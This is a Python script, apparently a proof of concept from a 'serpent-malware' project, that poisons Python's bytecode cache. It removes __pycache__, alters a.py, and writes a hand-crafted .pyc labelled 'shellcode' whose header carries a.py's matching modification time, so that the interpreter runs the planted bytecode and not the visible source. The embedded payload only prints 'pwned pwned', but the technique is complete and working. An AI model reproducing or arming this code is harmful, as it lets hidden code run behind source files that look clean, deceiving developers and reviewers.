import os
import time
import shutil
import hexdump


shellcode_template = \
    '610d0d0a00000000########27000000e30000000000000000000' \
    '00000000000000200000040000000731000000065006400830101' \
    '0064015a016402530029037a0a6120696d706f727465647a0b686' \
    '56c6c6f20776f726c644e2902da057072696e74da0161a9007203' \
    '0000007203000000fa3f2f6d6e742f632f55736572732f7573657' \
    '22f4465736b746f702f70726f6a656374732f73657270656e742d' \
    '6d616c776172652f73657270656e742f612e7079da083c6d6f647' \
    '56c653e0100000073020000000802'


shellcode_template = shellcode_template.replace('68656c6c6f20776f726c64', (b'pwned pwned').hex())


# shellcode_template = \
#     '610d0d0a00000000########33000000e30000000000000000000' \
#     '00000000000000200000040000000731000000065006400830101' \
#     '0064015a016402530029037a0a6120696d706f727465647a0b686' \
#     '56c6c6f20776f726c644e2902da057072696e74da0161a9007203' \
#     '0000007203000000fa3f2f6d6e742f632f55736572732f7573657' \
#     '22f4465736b746f702f70726f6a656374732f73657270656e742d' \
#     '6d616c776172652f73657270656e742f612e7079da083c6d6f647' \
#     '56c653e0200000073020000000802'


# shellcode_template = \
#     '610d0d0a00000000########39000000e30000000000000000000' \
#     '00000000000000200000040000000731000000065006400830101' \
#     '0064015a016402530029037a106120696d706f727465642070776' \
#     'e65647a1168656c6c6f20776f726c642070776e65644e2902da05' \
#     '7072696e74da0161a90072030000007203000000fa3f2f6d6e742' \
#     'f632f55736572732f757365722f4465736b746f702f70726f6a65' \
#     '6374732f73657270656e742d6d616c776172652f73657270656e7' \
#     '42f612e7079da083c6d6f64756c653e0200000073020000000802' \


def log(message, type='info'):

    print(f'[{time.ctime()}] {type} : {message}')


log('Removing existing pycache...')

try: shutil.rmtree('./__pycache__')
except: pass


log('Changing modification time of a.py...')

with open('./a.py', 'rb+') as file:

    content = list(file.read())
    content[0] = ord('x')
    content = bytes(content)

    file.seek(0)
    file.write(content)


modification_time = int(os.stat('./a.py').st_mtime)
modification_time_human = time.asctime(time.localtime(modification_time))
modification_time_difference = int(time.time()) - modification_time

log(f'New modification time is {hex(modification_time)} = {modification_time_human} (~{modification_time_difference} seconds ago).')


modification_time_bytes = modification_time.to_bytes(4, 'little')
modification_time_hex = modification_time_bytes.hex()

shellcode = shellcode_template.replace('#'*8, modification_time_hex)
shellcode_bytes = bytes.fromhex(shellcode)

dump = hexdump.hexdump(shellcode_bytes, result='return')


log(f'''Created shellcode:

{dump}
''')

time.sleep(0.1)

pyc_filename = 'a.cpython-39.pyc'

log(f'Writing shellcode to pycache...')

os.mkdir('__pycache__')

with open(f'./__pycache__/{pyc_filename}', 'wb') as file:
    file.write(shellcode_bytes)


modification_time_shellcode = int(os.stat(f'./__pycache__/{pyc_filename}').st_mtime)
modification_time_difference = modification_time_shellcode - modification_time

log(f'Shellcode/pycache was modified ~{modification_time_difference} seconds after a.py.')

with open('./a.py', 'rb') as file:
    file.read()

log('FINISHED')
